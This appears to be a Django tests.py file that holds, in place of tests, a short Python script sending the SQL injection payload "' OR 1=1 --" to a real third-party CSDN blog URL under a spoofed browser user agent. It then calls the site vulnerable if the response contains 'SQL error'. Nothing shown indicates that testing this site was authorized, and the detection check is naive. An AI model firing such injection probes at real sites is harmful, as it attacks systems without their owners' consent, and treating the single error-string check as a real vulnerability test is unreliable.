from django.test import TestCase

# Create your tests here.
import requests
from lxml import etree

url = 'https://blog.csdn.net/zxj19930410jy/article/details/119946590'

header = {
    'USER-AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.51'}

# SQL注入负载
payload = "' OR 1=1 --"

# 发送GET请求并添加SQL注入负载
response = requests.get(url + "?id=" + payload, headers=header)
# response = requests.get(url,headers=header)
print(response.url)
print(response.text)

# 分析响应并检查是否存在SQL注入漏洞
if "SQL error" in response.text:
    print("存在SQL注入漏洞！")
else:
    print("未发现SQL注入漏洞。")
